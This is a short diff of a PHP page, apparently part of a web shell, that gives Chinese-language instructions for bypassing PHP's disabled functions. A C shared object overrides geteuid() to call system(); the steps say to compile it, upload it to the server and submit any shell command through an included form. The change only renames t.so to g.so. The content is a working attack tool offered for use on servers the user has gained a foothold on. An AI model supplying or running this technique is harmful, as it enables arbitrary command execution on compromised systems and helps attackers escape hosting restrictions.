@@ -47,8 +47,8 @@ int geteuid() {
     system(cmdline);
 }');
     	echo '<p> <b>getuid使用方法</b>:</br>1. 把上面代码保存为g.c</br>';
-    	echo '2. 编译c文件为共享对象文件。 可以在linux系统执行：gcc -shared -fPIC g.c -o g.so &nbsp&nbsp  也可以使用我编译好的t.so</br>';
-    	echo '3. 上传t.so到服务器</br>';
+    	echo '2. 编译c文件为共享对象文件。 可以在linux系统执行：gcc -shared -fPIC g.c -o g.so &nbsp&nbsp  也可以使用我编译好的g.so</br>';
+    	echo '3. 上传g.so到服务器</br>';
         echo '4. 选择绕过方式为getuid，cmd填写要执行的命令；outpath填输出地址，地址必须为可读可写，一般默认即可；sopath填上传的t.so地址';
     	echo '<p><form action="" method="post" id="getuid_form">cmd:<input type="text" name="getuid_cmd" value="ls"></input> outpath:<input type="text" name="outpath" value="/tmp/xx"></input> sopath:<input type="text" name="sopath"></input><input type="submit" name="submit"></input></form>';
     break;
